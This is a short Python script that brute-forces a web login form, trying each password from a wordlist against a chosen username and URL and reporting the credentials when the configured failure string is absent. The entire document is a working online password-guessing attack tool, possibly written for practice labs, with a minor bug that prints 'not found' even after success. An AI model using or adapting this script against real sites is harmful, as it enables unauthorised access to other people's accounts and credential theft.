import requests
from termcolor import colored

url = input("Enter page URL: ")
username = input("Enter username for the account to brute force: ")
password_file = input("Enter password file to use: ")
login_fail = input("Enter string that occurs when login fails: ")
cookie_value = input("Enter cookie value (optional): ")

def cracking(username, url, passwords):
    for password in passwords:
        password = password.strip()
        print(colored("Trying " + password, "green"))
        data = {"username": username, "password": password, "Login": "submit"}
        if cookie_value:
            response = requests.get(url, params={"username": username, "password": password, "Login": "Login"}, cookies={"cookie": cookie_value})
        else:
            response = requests.post(url, data=data)
        
        if login_fail in response.content.decode():
            pass
        else:
            print(colored("Found username: " + username, "blue"))
            print(colored("Found password: " + password, "blue"))
            return  

with open(password_file, "r") as file:
    passwords = file.readlines()

cracking(username, url, passwords)

print("Password not found in the list :<{ ")
